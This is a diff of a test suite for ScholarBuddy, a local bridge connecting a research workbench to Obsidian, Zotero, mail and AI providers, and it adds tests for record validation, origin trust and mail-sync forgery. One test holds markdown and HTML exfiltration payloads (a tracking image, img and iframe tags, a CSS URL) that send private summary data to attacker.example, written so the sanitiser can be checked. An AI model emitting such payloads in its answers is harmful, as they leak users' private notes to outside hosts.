@@ -17,37 +17,38 @@ import os from "node:os";
 import path from "node:path";
 import test from "node:test";
 import {
-  addSubmissionEvent,
   authorize,
-  calendarContext,
-  createBridgeServer,
-  rotateBridgeToken,
-  deleteRecord,
-  detectPassageSection,
-  detectSubmissionStatus,
-  evidenceManifest,
-  ensureBridgeToken,
-  fulltextIndex,
-  handle,
-  invalidReferenceIds,
   issuePairingCode,
-  itemKeywords,
+  openGrantStore,
+  rotateBridgeToken,
+} from "../bridge/access.mjs";
+import { calendarContext, evidenceManifest, invalidReferenceIds } from "../bridge/ai-run.mjs";
+import {
   modelConfig,
   modelRequest,
   modelResponse,
-  testProviderModel,
-  normalizeZoteroPassage,
-  outlineFromFulltext,
-  parseRecord,
-  relevantFulltextExcerpt,
-  saveRecord,
-  searchObsidian,
   streamDelta,
+  testProviderModel,
+} from "../bridge/providers.mjs";
+import { deleteRecord, parseRecord, saveRecord } from "../bridge/records.mjs";
+import { createBridgeServer, handle } from "../bridge/server.mjs";
+import {
+  addSubmissionEvent,
+  detectSubmissionStatus,
   submissionEmailCandidate,
   syncSubmissionEmails,
   verifySubmissionAttempt,
+} from "../bridge/submissions.mjs";
+import { searchObsidian } from "../bridge/vault-search.mjs";
+import {
+  detectPassageSection,
+  fulltextIndex,
+  itemKeywords,
+  normalizeZoteroPassage,
+  outlineFromFulltext,
+  relevantFulltextExcerpt,
   zoteroItemsByKey,
-} from "../bridge/server.mjs";
+} from "../bridge/zotero.mjs";
 import { compareRecords } from "../shared/records.mjs";
 import { readEventStream } from "../shared/sse.mjs";
 import {
@@ -58,6 +59,7 @@ import {
 import { parseActions, systemPrompt } from "../bridge/prompts.mjs";
 import { topicTerms } from "../bridge/search-terms.mjs";
 import { parseEnv, updateLocalConfig } from "../bridge/local-settings.mjs";
+import { createGrantStore, GRANT_IDLE_MS, GRANT_MAX_AGE_MS } from "../bridge/grants.mjs";
 import { setupPage } from "../bridge/setup-page.mjs";
 import { AI_PROVIDER_DEFINITIONS } from "../shared/constants.mjs";
 import {
@@ -74,15 +76,15 @@ const bridgeToken = "test-token-with-at-least-thirty-two-characters";
 
 function config(vault) {
   return {
-    WORKBUDDY_ORIGINS: allowedOrigin,
+    SCHOLARBUDDY_ORIGINS: allowedOrigin,
     OBSIDIAN_VAULT_PATH: vault,
     _activityDirectory: path.join(vault, ".test-activity"),
     _bridgeToken: bridgeToken,
     // The request window and the token budget are process-wide, so a suite with
     // more AI tests than the production ceiling would fail whichever ones
     // happened to run last. The limiter is tested below with its own numbers.
-    WORKBUDDY_AI_REQUESTS_PER_10_MIN: "1000",
-    WORKBUDDY_AI_DAILY_TOKENS: "10000000",
+    SCHOLARBUDDY_AI_REQUESTS_PER_10_MIN: "1000",
+    SCHOLARBUDDY_AI_DAILY_TOKENS: "10000000",
   };
 }
 
@@ -129,7 +131,7 @@ test("bridge rejects hostile origins and missing pairing tokens before routing",
       new Request("http://127.0.0.1/health", {
         headers: { Origin: allowedOrigin, Authorization: `Bearer ${bridgeToken}` },
       }),
-      { ...settings, WORKBUDDY_ORIGINS: "*" },
+      { ...settings, SCHOLARBUDDY_ORIGINS: "*" },
     ).status,
     403,
   );
@@ -138,7 +140,7 @@ test("bridge rejects hostile origins and missing pairing tokens before routing",
       new Request("http://127.0.0.1/health", {
         headers: { Origin: allowedOrigin, Authorization: `Bearer ${bridgeToken}` },
       }),
-      { ...settings, WORKBUDDY_ORIGINS: `${allowedOrigin}/path` },
+      { ...settings, SCHOLARBUDDY_ORIGINS: `${allowedOrigin}/path` },
     ).status,
     403,
   );
@@ -269,7 +271,7 @@ test("local settings updates preserve comments and protect the file", async () =
 });
 
 test("write routes reject simple text/plain requests", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-content-type-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-content-type-"));
   try {
     await assert.rejects(
       handle(
@@ -289,7 +291,7 @@ test("write routes reject simple text/plain requests", async () => {
 });
 
 test("AI workflow stops before model execution when a selected source fails", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-retrieval-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-retrieval-"));
   try {
     const settings = {
       ...config(vault),
@@ -354,7 +356,7 @@ test("the daily token budget refuses a run before it reaches a provider", async 
       ...config("/tmp/unused"),
       DEEPSEEK_API_KEY: "must-not-be-used",
       // Below one reservation, so the budget is spent whatever else has run.
-      WORKBUDDY_AI_DAILY_TOKENS: "1000",
+      SCHOLARBUDDY_AI_DAILY_TOKENS: "1000",
     },
   );
   assert.equal(response.status, 429);
@@ -509,7 +511,7 @@ test("the local setup exposes a model availability test", () => {
 });
 
 test("AI notes never overwrite a prior save", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-ai-notes-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-ai-notes-"));
   try {
     const options = {
       method: "POST",
@@ -527,7 +529,7 @@ test("AI notes never overwrite a prior save", async () => {
 });
 
 test("Obsidian records save atomically, detect stale updates, and archive history", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-history-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-history-"));
   try {
     const first = await saveRecord(config(vault), "projects", {
       id: "PRJ-test",
@@ -573,7 +575,7 @@ test("Obsidian records save atomically, detect stale updates, and archive histor
 });
 
 test("record mutations serialize same-version writers instead of losing an update", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-record-race-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-race-"));
   try {
     const first = await saveRecord(config(vault), "projects", {
       id: "PRJ-race",
@@ -596,7 +598,7 @@ test("record mutations serialize same-version writers instead of losing an updat
 });
 
 test("permanent deletion removes both the live record and every history version", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-permanent-delete-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-permanent-delete-"));
   try {
     const first = await saveRecord(config(vault), "projects", {
       id: "PRJ-delete",
@@ -629,7 +631,7 @@ test("permanent deletion removes both the live record and every history version"
 });
 
 test("the record boundary rejects malformed stored types and drops legacy executable URLs", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-record-schema-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-schema-"));
   const folder = path.join(vault, "ScholarBuddy", "passages");
   try {
     await mkdir(folder, { recursive: true });
@@ -649,17 +651,139 @@ test("the record boundary rejects malformed stored types and drops legacy execut
       path.join(folder, "PASS-bad.md"),
       '---\ntitle: {"unexpected":true}\ncollection: "passages"\n---\n',
     );
+    const after = await (await handle(request("/workbench/state"), config(vault))).json();
+    assert.deepEqual(
+      after.passages.map((item) => item.id),
+      ["PASS-safe"],
+    );
+    assert.deepEqual(after.invalid, [
+      { collection: "passages", file: "PASS-bad.md", reason: "title must be a string." },
+    ]);
+    // The write boundary is unchanged: what a read tolerates, a save still refuses.
     await assert.rejects(
-      handle(request("/workbench/state"), config(vault)),
-      (error) => error.status === 422 && /title must be a string/.test(error.message),
+      saveRecord(config(vault), "passages", { title: { unexpected: true } }),
+      (error) => error.status === 422,
     );
   } finally {
     await rm(vault, { recursive: true, force: true });
   }
 });
 
+test("one unreadable note is reported on its own instead of emptying the workbench", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-isolation-"));
+  const folder = path.join(vault, "ScholarBuddy", "operations");
+  try {
+    const good = await saveRecord(config(vault), "operations", {
+      title: "Ethics renewal",
+      dueDate: "2026-11-01",
+    });
+    const project = await saveRecord(config(vault), "projects", { title: "Load monitoring" });
+    await writeFile(
+      path.join(folder, "OPS-HANDMADE.md"),
+      "---\ntitle: Budget report\ndueDate: next friday\n---\n",
+    );
+    // A sync-conflict copy is not a record any save or delete could address.
+    await writeFile(
+      path.join(folder, `${good.id} (conflicted copy).md`),
+      "---\ntitle: Ethics renewal\n---\n",
+    );
+    const response = await handle(request("/workbench/state"), config(vault));
+    assert.equal(response.status, 200);
+    const state = await response.json();
+    assert.deepEqual(
+      state.operations.map((item) => item.id),
+      [good.id],
+    );
+    assert.deepEqual(
+      state.projects.map((item) => item.id),
+      [project.id],
+    );
+    const copy = `${good.id} (conflicted copy).md`;
+    assert.ok(state.invalid.every((item) => item.collection === "operations"));
+    const reasons = Object.fromEntries(state.invalid.map((item) => [item.file, item.reason]));
+    assert.deepEqual(Object.keys(reasons).sort(), ["OPS-HANDMADE.md", copy].sort());
+    assert.equal(reasons["OPS-HANDMADE.md"], "dueDate must be a valid date.");
+    assert.match(reasons[copy], /Rename the file/);
+    // The note that loaded is still editable, and nothing touched the ones that did not.
+    const [loaded] = state.operations;
+    assert.equal((await saveRecord(config(vault), "operations", loaded)).version, 2);
+    assert.match(await readFile(path.join(folder, "OPS-HANDMADE.md"), "utf8"), /next friday/);
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
+test("a note rewritten in YAML's own spelling loads as the same record", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-yaml-"));
+  const folder = path.join(vault, "ScholarBuddy", "reading-queue");
+  try {
+    await mkdir(folder, { recursive: true });
+    // What Obsidian's property editor leaves behind: unquoted scalars, a block
+    // list, and a flow list where the Bridge had written JSON.
+    await writeFile(
+      path.join(folder, "READ-YAML.md"),
+      [
+        "---",
+        "title: Session RPE validity",
+        "year: 2024",
+        "version: 3",
+        "creators:",
+        "  - Ann Lee",
+        '  - "Bo Chen"',
+        "zoteroTags: [hrv, load monitoring]",
+        "tags:",
+        "  - sports",
+        "  - hrv",
+        "---",
+        "",
+        "notes",
+        "",
+      ].join("\n"),
+    );
+    const state = await (await handle(request("/workbench/state"), config(vault))).json();
+    assert.deepEqual(state.invalid, []);
+    const [record] = state["reading-queue"];
+    assert.equal(record.year, "2024");
+    assert.equal(record.version, 3);
+    assert.deepEqual(record.creators, ["Ann Lee", "Bo Chen"]);
+    assert.deepEqual(record.zoteroTags, ["hrv", "load monitoring"]);
+    assert.deepEqual(record.tags, ["sports", "hrv"]);
+    assert.equal(record.description, "notes");
+    // A list a plugin added stays a list after ScholarBuddy saves the note.
+    await saveRecord(config(vault), "reading-queue", { ...record, status: "Reading" });
+    const written = await readFile(path.join(folder, "READ-YAML.md"), "utf8");
+    assert.match(written, /^tags: \["sports","hrv"\]$/m);
+    assert.match(written, /^creators: \["Ann Lee","Bo Chen"\]$/m);
+    assert.match(written, /^year: "2024"$/m);
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
+test("a damaged workspace pointer does not fail the load and is rebuilt on save", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-workspace-"));
+  try {
+    const project = await saveRecord(config(vault), "projects", { title: "Thesis", active: true });
+    const pointer = path.join(vault, "ScholarBuddy", ".workspace.json");
+    await writeFile(pointer, '{"activeProjectId": "PRJ-');
+    const state = await (await handle(request("/workbench/state"), config(vault))).json();
+    assert.deepEqual(
+      state.projects.map((item) => [item.id, item.active]),
+      [[project.id, false]],
+    );
+    const saved = await saveRecord(config(vault), "projects", {
+      ...state.projects[0],
+      active: true,
+    });
+    assert.equal(saved.active, true);
+    assert.deepEqual(JSON.parse(await readFile(pointer, "utf8")), { activeProjectId: project.id });
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
 test("paper issues keep the problem, plan, and response in one record", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-paper-issue-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-paper-issue-"));
   try {
     const issue = await saveRecord(config(vault), "reviews", {
       title: "Clarify the sampling decision",
@@ -684,7 +808,7 @@ test("paper issues keep the problem, plan, and response in one record", async ()
 });
 
 test("Obsidian records validate common fields and keep only one active project", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-record-validation-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-validation-"));
   try {
     const first = await saveRecord(config(vault), "projects", {
       id: "PRJ-one",
@@ -710,7 +834,7 @@ test("Obsidian records validate common fields and keep only one active project",
 });
 
 test("research log entries and ideas are ordinary records with their own dates and links", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-capture-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-capture-"));
   try {
     const entry = await saveRecord(config(vault), "journal", {
       title: "Re-ran the GAM",
@@ -880,6 +1004,288 @@ test("Zotero open links are derived from inert keys under a fixed protocol", () 
   assert.match(url, /^zotero:\/\/open-pdf\/library\/items\//);
   assert.doesNotMatch(url, /^javascript:/i);
   assert.match(url, /annotation=ANN\+1/);
+});
+
+test("only https origins and this computer's own localhost are trusted with the token", () => {
+  const settings = {
+    ...config("/tmp/unused"),
+    SCHOLARBUDDY_ORIGINS: "http://lab.example,http://192.168.1.20:3000,http://localhost:3000",
+  };
+  const from = (origin) =>
+    authorize(
+      new Request("http://127.0.0.1/health", {
+        headers: { Origin: origin, Authorization: `Bearer ${bridgeToken}` },
+      }),
+      settings,
+    );
+  assert.equal(from("http://lab.example").code, "origin_denied");
+  assert.equal(from("http://192.168.1.20:3000").code, "origin_denied");
+  assert.equal(from("http://localhost:3000").ok, true);
+});
+
+test("a new installation trusts no local development server", async () => {
+  const example = parseEnv(
+    await readFile(new URL("../.env.local.example", import.meta.url), "utf8"),
+  );
+  const origins = example.SCHOLARBUDDY_ORIGINS.split(",");
+  assert.ok(origins.includes("https://www.scholarbuddy.tech"));
+  for (const origin of origins) assert.match(origin, /^https:\/\//);
+});
+
+test("a property name that could not be read back is refused, and a list stays a list", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-record-names-"));
+  try {
+    for (const name of ['status: "Promoted"\nversion', "a:b", " padded", ""])
+      await assert.rejects(
+        saveRecord(config(vault), "ideas", { title: "x", [name]: 1 }),
+        (error) => error.status === 422 && /name that cannot be stored/.test(error.message),
+      );
+    // Names Obsidian itself allows keep working, in any script.
+    const saved = await saveRecord(config(vault), "ideas", {
+      title: "x",
+      "date created": "2026-10-01",
+      标签: ["足球", "hrv"],
+    });
+    const state = await (await handle(request("/workbench/state"), config(vault))).json();
+    assert.equal(state.ideas[0]["date created"], "2026-10-01");
+    assert.deepEqual(state.ideas[0]["标签"], ["足球", "hrv"]);
+    assert.equal(state.ideas[0].id, saved.id);
+
+    // Whatever a note already holds can be saved back: a comment line and a quoted
+    // key are odd property names, but they are the file's own and they read back.
+    const file = path.join(vault, "ScholarBuddy", "ideas", `${saved.id}.md`);
+    await writeFile(
+      file,
+      (await readFile(file, "utf8")).replace(
+        "---\n\n",
+        '# reviewed: yes\n"quoted key": 1\nrelated: [[Pilot study]]\nphase: [Draft]\n---\n\n',
+      ),
+    );
+    const [edited] = (await (await handle(request("/workbench/state"), config(vault))).json())
+      .ideas;
+    // A hand-written link stays a link, and bracketed text in a text field stays text.
+    assert.equal(edited.related, "[[Pilot study]]");
+    assert.equal(edited.phase, "[Draft]");
+    const resaved = await saveRecord(config(vault), "ideas", { ...edited, title: "y" });
+    assert.equal(resaved["# reviewed"], "yes");
+    assert.equal(resaved['"quoted key"'], 1);
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
+test("a search that only covered part of the vault says so", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-vault-coverage-"));
+  try {
+    await writeFile(path.join(vault, "note.md"), "hamstring strain");
+    const small = await (
+      await handle(request("/obsidian/search?q=hamstring"), config(vault))
+    ).json();
+    assert.equal(small.notes.length, 1);
+    assert.equal(small.partial, "");
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+  const large = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-vault-coverage-"));
+  try {
+    await Promise.all(
+      Array.from({ length: 2501 }, (_, index) =>
+        writeFile(path.join(large, `note-${String(index).padStart(4, "0")}.md`), "hamstring"),
+      ),
+    );
+    const body = await (
+      await handle(request("/obsidian/search?q=hamstring"), config(large))
+    ).json();
+    assert.match(body.partial, /Only the first 2,500 notes in the vault were searched/);
+  } finally {
+    await rm(large, { recursive: true, force: true });
+  }
+});
+
+test("the passage list reports how many annotations lie beyond the page it read", async () => {
+  const annotation = (index) => ({
+    data: { key: `ANN${index}`, itemType: "annotation", annotationText: `Highlight ${index}` },
+  });
+  let exact = false;
+  const zotero = createServer((incoming, outgoing) => {
+    const url = new URL(incoming.url, "http://zotero.test");
+    const total = url.searchParams.get("itemType") === "annotation" ? (exact ? "250" : "730") : "0";
+    outgoing.writeHead(200, { "Content-Type": "application/json", "Total-Results": total });
+    outgoing.end(
+      JSON.stringify(
+        url.searchParams.get("itemType") === "annotation"
+          ? Array.from({ length: 250 }, (_, index) => annotation(index))
+          : [],
+      ),
+    );
+  });
+  await new Promise((resolve) => zotero.listen(0, "127.0.0.1", resolve));
+  try {
+    const settings = {
+      ...config("/tmp/unused"),
+      ZOTERO_LOCAL_URL: `http://127.0.0.1:${zotero.address().port}`,
+    };
+    const body = await (await handle(request("/zotero/passages"), settings)).json();
+    assert.equal(body.passages.length, 250);
+    assert.deepEqual([body.limit, body.total, body.truncated], [250, 730, true]);
+    // Exactly one page of annotations is the whole library, not a truncated one.
+    exact = true;
+    const whole = await (await handle(request("/zotero/passages"), settings)).json();
+    assert.deepEqual([whole.total, whole.truncated], [250, false]);
+  } finally {
+    await new Promise((resolve) => zotero.close(resolve));
+  }
+});
+
+test("an unreadable event note stops the decisions that need the whole event log", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-incomplete-"));
+  try {
+    const attempt = await saveRecord(config(vault), "submission-attempts", {
+      title: "Paper · Journal",
+      submissionId: "SPORT-D-26-00042",
+      status: "Submitted",
+    });
+    await mkdir(path.join(vault, "ScholarBuddy", "submission-events"), { recursive: true });
+    await writeFile(
+      path.join(vault, "ScholarBuddy", "submission-events", "SEV-HANDMADE.md"),
+      "---\ntitle: Under review\neventDate: sometime in May\n---\n",
+    );
+    // Whether this status was already recorded cannot be known from a partial log.
+    await assert.rejects(
+      addSubmissionEvent(config(vault), { attemptId: attempt.id, status: "Under Review" }),
+      (error) =>
+        error.status === 409 &&
+        error.code === "collection_incomplete" &&
+        /submission-events\/SEV-HANDMADE\.md first: eventDate must be a valid date\./.test(
+          error.message,
+        ),
+    );
+    await assert.rejects(
+      syncSubmissionEmails({ ...config(vault), _mailRunner: async () => ({ messages: [] }) }),
+      (error) => error.code === "collection_incomplete",
+    );
+    // Nothing else is held up by it.
+    const state = await (await handle(request("/workbench/state"), config(vault))).json();
+    assert.equal(state["submission-attempts"][0].status, "Submitted");
+    assert.equal(state.invalid.length, 1);
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
+test("a mail check reports what it left unread and takes no mail from the browser", async () => {
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-mail-coverage-"));
+  try {
+    const attempt = await saveRecord(config(vault), "submission-attempts", {
+      title: "Paper · Journal",
+      submissionId: "SPORT-D-26-00042",
+      status: "Submitted",
+    });
+    const scans = [];
+    const settings = {
+      ...config(vault),
+      _mailRunner: async (action, payload) => {
+        scans.push({ action, limit: payload.limit });
+        return { messages: [], limited: true, unchecked: scans.length === 1 ? 412 : null };
+      },
+    };
+    const forged = {
+      id: "forged-1",
+      subject: "SPORT-D-26-00042 is now under review",
+      sender: "editor@example.org",
+      receivedAt: new Date().toISOString(),
+      body: "Your submission SPORT-D-26-00042 is under review.",
+    };
+    const response = await handle(
+      request("/submissions/email-sync", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ emails: [forged] }),
+      }),
+      settings,
+    );
+    const result = await response.json();
+    assert.deepEqual(scans, [{ action: "scan", limit: 250 }]);
+    assert.deepEqual([result.scanned, result.updated.length], [0, 0]);
+    assert.equal(result.partial, "412 more inbox messages from the last 45 days were not checked.");
+    // When Mail could not filter by date the Bridge cannot count the window, and
+    // says only what it knows.
+    const blind = await syncSubmissionEmails(settings);
+    assert.equal(blind.partial, "Only the first 250 inbox messages were checked.");
+    const state = await (await handle(request("/workbench/state"), settings)).json();
+    assert.equal(state["submission-attempts"][0].status, "Submitted");
+    assert.equal(state["submission-attempts"][0].id, attempt.id);
+  } finally {
+    await rm(vault, { recursive: true, force: true });
+  }
+});
+
+test("an answer cannot embed anything that would be fetched once it is in the vault", () => {
+  const { output, actions } = parseActions(
+    [
+      "Evidence is moderate [Z1].",
+      "![tracking](https://attacker.example/p.png?d=private+summary)",
+      '<img src="https://attacker.example/x"><IFRAME src=//attacker.example></iframe>',
+      '<div style="background:url(https://attacker.example/?d=leak)"></div><input type=image src=x>',
+      "p < .05 and ![[embedded note]] stay readable.",
+      "```scholarbuddy-actions",
+      '{"actions":[{"title":"Check ![x](https://attacker.example/t)","kind":"task","detail":"<img src=x>"}]}',
+      "```",
+    ].join("\n"),
+  );
+  assert.doesNotMatch(output, /!\[/);
+  assert.doesNotMatch(output, /<[a-z/]/i);
+  assert.match(output, /\[tracking\]\(https:\/\/attacker\.example/);
+  assert.match(output, /p < \.05 and \[\[embedded note\]\] stay readable\./);
+  assert.equal(actions[0].title, "Check [x](https://attacker.example/t)");
+  assert.equal(actions[0].detail, "&lt;img src=x>");
+});
+
+test("a provider key is only sent for checking when a check is asked for", async () => {
+  const seen = [];
+  const provider = createServer((incoming, outgoing) => {
+    seen.push(incoming.url);
+    outgoing.writeHead(incoming.headers.authorization === "Bearer good-key-12345" ? 200 : 401);
+    outgoing.end("{}");
+  });
+  await new Promise((resolve) => provider.listen(0, "127.0.0.1", resolve));
+  try {
+    const settings = {
+      ...config("/tmp/unused"),
+      OPENAI_API_KEY: "bad-key-12345",
+      OPENAI_BASE_URL: `http://127.0.0.1:${provider.address().port}`,
+      ZOTERO_LOCAL_URL: "http://127.0.0.1:9",
+      _calendarRunner: async () => ({ events: [] }),
+    };
+    // The poll every open tab makes: nothing leaves the machine.
+    const polled = await (await handle(request("/status?fresh=0"), settings)).json();
+    assert.equal(seen.length, 0);
+    assert.equal(polled.openai.configured, true);
+    // "Test again" in Connections: the key is checked, and the verdict then stands.
+    const checked = await (await handle(request("/status?fresh=1"), settings)).json();
+    assert.deepEqual(seen, ["/models"]);
+    assert.equal(checked.openai.configured, false);
+    assert.equal(checked.deepseek.configured, false);
+    // A provider that cannot be reached gives no verdict, and none is remembered:
+    // a good key must not read as missing until someone thinks to test again.
+    const offline = {
+      ...settings,
+      OPENAI_API_KEY: "good-key-12345",
+      OPENAI_BASE_URL: "http://127.0.0.1:9",
+    };
+    assert.equal(
+      (await (await handle(request("/status?fresh=1"), offline)).json()).openai.configured,
+      true,
+    );
+    // A different key is a different question.
+    const replaced = await (
+      await handle(request("/status?fresh=1"), { ...settings, OPENAI_API_KEY: "good-key-12345" })
+    ).json();
+    assert.equal(replaced.openai.configured, true);
+    assert.equal(seen.length, 2);
+  } finally {
+    await new Promise((resolve) => provider.close(resolve));
+  }
 });
 
 test("the example provider configuration matches the shared defaults", async () => {
@@ -1133,7 +1539,7 @@ test("calendar adapter uses interval overlap and preserves notes unless supplied
   assert.match(source, /payload\.notes !== undefined/);
   assert.match(source, /findEventByExternalId/);
   assert.match(source, /deduplicated: true/);
-  assert.match(source, /WorkBuddy-ID/);
+  assert.match(source, /ScholarBuddy-ID/);
   assert.match(source, /events\.whose/);
   assert.doesNotMatch(source, /startDate >= start && startDate < end/);
 });
@@ -1177,7 +1583,7 @@ test("submission email matching requires manuscript context and reports confiden
 });
 
 test("submission events append history and advance the attempt", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-submission-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-submission-"));
   try {
     await saveRecord(config(vault), "manuscripts", { id: "MS-one", title: "Paper one" });
     await saveRecord(config(vault), "submission-attempts", {
@@ -1207,7 +1613,7 @@ test("submission events append history and advance the attempt", async () => {
 });
 
 test("checking an unchanged submission updates verification without adding timeline noise", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-submission-check-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-submission-check-"));
   try {
     await saveRecord(config(vault), "submission-attempts", {
       id: "SUB-one",
@@ -1236,7 +1642,7 @@ test("checking an unchanged submission updates verification without adding timel
 });
 
 test("a revised submission advances the round inside the same journal attempt", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-revision-round-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-revision-round-"));
   try {
     await saveRecord(config(vault), "submission-attempts", {
       id: "SUB-one",
@@ -1259,7 +1665,7 @@ test("a revised submission advances the round inside the same journal attempt", 
 });
 
 test("high-confidence email sync is idempotent", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-email-sync-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-email-sync-"));
   try {
     await saveRecord(config(vault), "submission-attempts", {
       id: "SUB-one",
@@ -1288,7 +1694,7 @@ test("high-confidence email sync is idempotent", async () => {
 });
 
 test("email that repeats the current stage only verifies the attempt", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-email-verification-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-email-verification-"));
   try {
     await saveRecord(config(vault), "submission-attempts", {
       id: "SUB-one",
@@ -1319,7 +1725,7 @@ test("email that repeats the current stage only verifies the attempt", async () 
 });
 
 test("consequential email statuses require confirmation", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-email-confirmation-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-email-confirmation-"));
   try {
     await saveRecord(config(vault), "submission-attempts", {
       id: "SUB-one",
@@ -1347,7 +1753,7 @@ test("consequential email statuses require confirmation", async () => {
 });
 
 test("Obsidian search reuses note text until a note actually changes", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-vault-cache-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-vault-cache-"));
   try {
     const note = path.join(vault, "sprint-methods.md");
     await writeFile(note, "Original methods describe the sprint protocol.", "utf8");
@@ -1478,7 +1884,7 @@ async function workflowHarness(run, calendar = null) {
   });
   await new Promise((resolve) => zotero.listen(0, "127.0.0.1", resolve));
   await new Promise((resolve) => provider.listen(0, "127.0.0.1", resolve));
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-workflow-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-workflow-"));
   try {
     await writeFile(
       path.join(vault, "pressing.md"),
@@ -1577,7 +1983,7 @@ test("@evidence-for-claim keeps the other papers when one attachment fails", asy
   });
   await new Promise((resolve) => zotero.listen(0, "127.0.0.1", resolve));
   await new Promise((resolve) => provider.listen(0, "127.0.0.1", resolve));
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-evidence-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-evidence-"));
   try {
     const response = await handle(
       request("/ai/run", {
@@ -2016,7 +2422,7 @@ test("focus terms are ranked by what recurs and keep the acronyms that matter", 
 });
 
 test("bilingual retrieval ranks by BM25 and recalls across the synonym table", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-bm25-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-bm25-"));
   try {
     await writeFile(
       path.join(vault, "physiology.md"),
@@ -2044,7 +2450,7 @@ test("bilingual retrieval ranks by BM25 and recalls across the synonym table", a
 });
 
 test("a streaming run still refuses to start when a selected source fails", async () => {
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-stream-retrieval-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-stream-retrieval-"));
   try {
     const response = await handle(
       request("/ai/stream", {
@@ -2082,7 +2488,7 @@ test("a streamed provider failure preserves safe upstream diagnostics", async ()
     );
   });
   await new Promise((resolve) => provider.listen(0, "127.0.0.1", resolve));
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-provider-error-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-provider-error-"));
   try {
     const response = await handle(
       request("/ai/stream", {
@@ -2140,7 +2546,7 @@ test("a streamed run emits deltas, audits the finished answer, and keeps a follo
     outgoing.end("data: [DONE]\n\n");
   });
   await new Promise((resolve) => provider.listen(0, "127.0.0.1", resolve));
-  const vault = await mkdtemp(path.join(os.tmpdir(), "workbuddy-stream-"));
+  const vault = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-stream-"));
   try {
     await writeFile(
       path.join(vault, "effects.md"),
@@ -2240,31 +2646,257 @@ test("a streamed run emits deltas, audits the finished answer, and keeps a follo
   }
 });
 
-test("token initialization and authorization reject damaged credentials", async () => {
+test("paired browsers are kept as hashes, and a damaged credential never authorizes", async () => {
   const directory = await mkdtemp(path.join(os.tmpdir(), "scholarbuddy-token-"));
-  const file = path.join(directory, "token");
+  const file = path.join(directory, "grants.json");
   try {
-    const token = await ensureBridgeToken({}, file);
+    // There is no shared token on disk for anyone to steal.
+    const store = await openGrantStore(file);
+    assert.deepEqual(store.list(), []);
+    const token = await store.issue(allowedOrigin);
     assert.ok(token.length >= 32);
-    assert.equal(await ensureBridgeToken({}, file), token);
     assert.equal((await stat(file)).mode & 0o777, 0o600);
-    for (const invalid of ["", "short", " ".repeat(40)]) {
-      await writeFile(file, invalid);
